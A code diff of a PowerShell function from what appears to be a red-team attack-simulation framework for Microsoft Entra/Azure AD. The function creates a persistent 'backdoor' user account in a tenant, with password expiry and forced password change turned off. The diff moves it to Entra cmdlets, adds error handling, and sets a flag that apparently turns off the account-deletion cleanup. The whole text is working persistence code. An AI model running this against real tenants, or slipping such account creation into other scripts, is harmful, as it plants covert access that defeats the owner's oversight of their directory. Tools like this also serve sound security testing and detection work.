@@ -1,16 +1,41 @@
 #Create a user
 function CreateAccount {
     mitre_details("CreateAccount")
+    $allow_undo = $false
+
+    try {
+        Import-Module -Name Microsoft.Entra.Users -WarningAction SilentlyContinue -ErrorAction Stop | Out-Null
+        Import-Module -Name Microsoft.Entra.DirectoryManagement -WarningAction SilentlyContinue -ErrorAction Stop | Out-Null
+    }
+    catch {
+        MAADWriteError "Required Entra user modules could not be loaded"
+        MAADWriteError $_.Exception.Message
+        MAADPause
+        return
+    }
 
     #Create Admin Account
     MAADWriteProcess "Fetching available domains"
-    Get-AzureADDomain | Format-Table Name, SupportedServices, AuthenticationType
+    try {
+        Get-EntraDomain -ErrorAction Stop | Format-Table Name, SupportedServices, AuthenticationType
+    }
+    catch {
+        MAADWriteInfo "Unable to list tenant domains"
+        MAADWriteInfo "Continue by entering a full user principal name manually"
+        MAADWriteError $_.Exception.Message
+    }
     $new_backdoor_username = Read-Host -Prompt "`n[?] Create Username for backdoor account (eg: user@domain.com)"
     $new_backdoor_pass = Read-Host -Prompt "`n[?] Create password for backdoor account (must comply with password policy)"
     $new_backdoor_display_name = Read-Host -Prompt "`n[?] Create Display Name for backdoor account (eg: Don Joe)"
     Write-Host ""
     $new_backdoor_display_name = $new_backdoor_display_name  -replace " ","" 
-    $new_backdoor_pass_secure = ConvertTo-SecureString $new_backdoor_pass -AsPlainText -Force 
+
+    if ([string]::IsNullOrWhiteSpace($new_backdoor_username) -or [string]::IsNullOrWhiteSpace($new_backdoor_pass) -or [string]::IsNullOrWhiteSpace($new_backdoor_display_name)) {
+        MAADWriteError "Backdoor account creation aborted"
+        MAADWriteInfo "Username, password, and display name are all required"
+        MAADPause
+        return
+    }
 
     #Create new account
     try {
@@ -19,7 +44,7 @@ function CreateAccount {
         $PasswordProfile.Password = $new_backdoor_pass
         $PasswordProfile.EnforceChangePasswordPolicy = $false
         $PasswordProfile.ForceChangePasswordNextLogin = $false
-        $backdoor_details = New-AzureADUser -DisplayName $new_backdoor_display_name -PasswordProfile $PasswordProfile -UserPrincipalName $new_backdoor_username -AccountEnabled $true -MailNickName $new_backdoor_display_name -ErrorAction Stop 
+        $backdoor_details = New-EntraUser -DisplayName $new_backdoor_display_name -PasswordProfile $PasswordProfile -UserPrincipalName $new_backdoor_username -AccountEnabled $true -MailNickName $new_backdoor_display_name -ErrorAction Stop 
         Start-Sleep -Seconds 10
         MAADWriteProcess "Backdoor account added to tenant"
         MAADWriteProcess "Backdoor User -> $new_backdoor_display_name ($new_backdoor_username)"
@@ -35,6 +60,7 @@ function CreateAccount {
     }
     catch {
         MAADWriteError "Failed to create new backdoor account"
+        MAADWriteError $_.Exception.Message
     }
 
     if ($allow_undo -eq $true){
@@ -44,12 +70,13 @@ function CreateAccount {
         if ($user_confirm -notin "No","no","N","n") {
             try {
                 MAADWriteProcess "Attempting to delete backdoor account -> $new_backdoor_username"
-                Remove-AzureADUser -ObjectId $new_backdoor_username -ErrorAction Stop | Out-Null
-                MAADWriteProcess "Deleted -> Account: $target_account"
+                Remove-EntraUser -UserId $new_backdoor_username -ErrorAction Stop | Out-Null
+                MAADWriteProcess "Deleted -> Account: $new_backdoor_username"
                 MAADWriteSuccess "Backdoor Account Deleted"
             }
             catch {
                 MAADWriteError "Failed to delete backdoor account"
+                MAADWriteError $_.Exception.Message
             }
         }
     }
